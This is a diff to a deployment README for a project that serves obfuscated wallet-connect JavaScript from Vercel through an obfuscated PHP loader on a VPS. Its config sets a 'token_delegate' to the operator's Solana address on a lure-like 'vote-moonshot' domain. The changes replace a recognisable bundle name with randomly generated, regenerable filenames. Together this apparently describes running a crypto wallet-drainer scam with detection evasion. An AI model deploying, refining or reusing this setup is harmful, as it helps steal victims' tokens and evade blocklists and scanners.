@@ -16,8 +16,8 @@ npm run build
 
 | Output | Obfuscated? |
 |--------|-------------|
-| `vercel/public/wallet.bundle.js` | Your app code yes; Reown/Solana libs minified only* |
-| `vercel/public/profile/page.js` | Yes |
+| `vercel/public/*.js` | Random names from `vercel/asset-names.json` |
+| `vercel/public/profile/*.js` | Random profile script name |
 | `vercel/public/profile/index.html` | No (public HTML) |
 | `vps/public/index.html` | No (public HTML) |
 | `vps/loader.obf.php` | Yes (upload as `loader.php`) |
@@ -61,7 +61,7 @@ scp -r vps/public/* user@vps:/var/www/mysite/vps/public/
 ```php
 'reown_project_id' => 'YOUR_REOWN_ID',
 'site_url' => 'https://vote-moonshot.top',
-'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/wallet.bundle.js',
+'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/p7KqN2mR9vXw.js',
 'button_class' => 'K7mQ2',
 'connect_popup_enabled' => true,
 'token_delegate' => 'YOUR_SOLANA_ADDRESS',
@@ -74,7 +74,14 @@ scp -r vps/public/* user@vps:/var/www/mysite/vps/public/
 
 1. Import repo → **Root Directory:** `vercel` → Deploy
 2. Build command: `npm run build` (or `cd .. && npm run build` if root build needed)
-3. URLs: `/wallet.bundle.js` and `/profile`
+3. JS URLs come from `vercel/asset-names.json` (synced into `loader.php` on build)
+
+Regenerate random JS filenames:
+
+```bash
+cd vercel && npm run new-asset-names
+cd .. && npm run build
+```
 
 Reown dashboard → allow **your HTML domain**
 
@@ -87,4 +94,4 @@ Reown dashboard → allow **your HTML domain**
 Pick wallet → popup YOUR-PROJECT.vercel.app/profile
 ```
 
-Clear VPS cache after Vercel deploy: `rm -f vps/cache/wallet.bundle.js`
+Clear VPS cache after Vercel deploy: `rm -f vps/cache/bundle.cache.js`
